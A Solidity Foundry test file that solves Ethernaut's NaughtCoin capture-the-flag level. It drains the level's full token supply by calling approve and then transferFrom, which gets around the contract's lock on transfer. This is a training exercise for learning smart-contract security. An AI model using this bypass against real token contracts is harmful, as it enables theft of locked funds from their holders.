// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";
import {NaughtCoinFactory} from "../src/15-NaughtCoin/NaughtCoinFactory.sol";
import {NaughtCoin} from "../src/15-NaughtCoin/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    Ethernaut public ethernaut;
    address user = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function test_NaughtCoinAttack() public {
        // SETUP
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        ethernaut.registerLevel(naughtCoinFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(naughtCoinFactory);
        NaughtCoin ethernautNaughtCoin = NaughtCoin(levelAddress);

        // ATTACK
        ethernautNaughtCoin.approve(tx.origin, ethernautNaughtCoin.INITIAL_SUPPLY());
        ethernautNaughtCoin.transferFrom(tx.origin, user, ethernautNaughtCoin.INITIAL_SUPPLY());

        // SUBMIT
        assertTrue(ethernaut.submitLevelInstance(payable(levelAddress)), "level not solved");
        vm.stopPrank();
    }
}
